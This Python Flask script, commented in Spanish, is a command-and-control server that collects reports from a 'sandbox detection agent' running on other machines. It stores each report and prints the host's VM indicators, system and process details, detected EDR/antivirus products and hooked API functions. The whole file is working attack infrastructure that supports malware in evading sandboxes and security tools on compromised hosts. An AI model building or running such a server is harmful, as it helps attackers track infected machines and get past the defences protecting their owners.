#!/usr/bin/env python3
"""
Servidor C2 simple para recibir datos del agente de detección de sandbox
"""

from flask import Flask, request, jsonify
import json
import os
from datetime import datetime

app = Flask(__name__)

# Directorio para guardar los datos
DATA_DIR = "collected_data"
os.makedirs(DATA_DIR, exist_ok=True)

@app.route('/content', methods=['POST'])
def receive_content():
    """Endpoint para recibir datos del agente"""
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({"error": "No data received"}), 400
        
        # Extraer información básica
        hostname = data.get('hostname', 'unknown')
        timestamp = data.get('timestamp', datetime.now().isoformat())
        
        # Crear nombre de archivo único
        safe_timestamp = timestamp.replace(':', '-').replace('.', '-')
        filename = f"{DATA_DIR}/{hostname}_{safe_timestamp}.json"
        
        # Guardar datos
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        # Mostrar resumen en consola
        print(f"\n{'='*60}")
        print(f"[+] Datos recibidos de: {hostname}")
        print(f"[+] Timestamp: {timestamp}")
        print(f"[+] Guardado en: {filename}")
        
        # Mostrar información relevante
        if 'sandbox_info' in data:
            is_vm = data['sandbox_info'].get('is_vm', False)
            vm_count = len(data['sandbox_info'].get('vm_indicators', []))
            print(f"[*] Es VM: {is_vm} ({vm_count} indicadores)")
        
        if 'system_info' in data:
            cpu = data['system_info'].get('cpu_count', 0)
            ram = data['system_info'].get('total_ram_mb', 0)
            processes = len(data['system_info'].get('processes', []))
            print(f"[*] Sistema: {cpu} CPUs, {ram} MB RAM, {processes} procesos")
        
        if 'edr_info' in data:
            edrs = data['edr_info'].get('detected_products', [])
            if edrs:
                print(f"[*] EDR/AV detectados: {len(edrs)}")
                for edr in edrs:
                    print(f"    - {edr['name']} ({edr['method']})")
        
        if 'hook_info' in data:
            hooked = [f for f in data['hook_info'].get('hooked_functions', []) if f.get('is_hooked')]
            if hooked:
                print(f"[!] Funciones hooked: {len(hooked)}")
                for hook in hooked:
                    print(f"    - {hook['function']}")
        
        print(f"{'='*60}\n")
        
        return jsonify({
            "status": "ok",
            "message": "Data received successfully",
            "filename": filename
        }), 200
        
    except Exception as e:
        print(f"[!] Error procesando datos: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/health', methods=['GET'])
def health():
    """Endpoint de health check"""
    return jsonify({"status": "ok", "service": "sandbox-detection-c2"}), 200

@app.route('/stats', methods=['GET'])
def stats():
    """Endpoint para ver estadísticas"""
    files = [f for f in os.listdir(DATA_DIR) if f.endswith('.json')]
    
    return jsonify({
        "total_reports": len(files),
        "data_directory": DATA_DIR,
        "files": files
    }), 200

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║         Sandbox Detection C2 Server                       ║
    ║         Listening for agent connections...                ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    print(f"[*] Data will be saved to: {os.path.abspath(DATA_DIR)}")
    print(f"[*] Server starting on http://192.168.1.143:8080")
    print(f"[*] Endpoints:")
    print(f"    - POST /content  - Receive agent data")
    print(f"    - GET  /health   - Health check")
    print(f"    - GET  /stats    - View statistics")
    print()
    
    app.run(host='192.168.1.143', port=8080, debug=False)
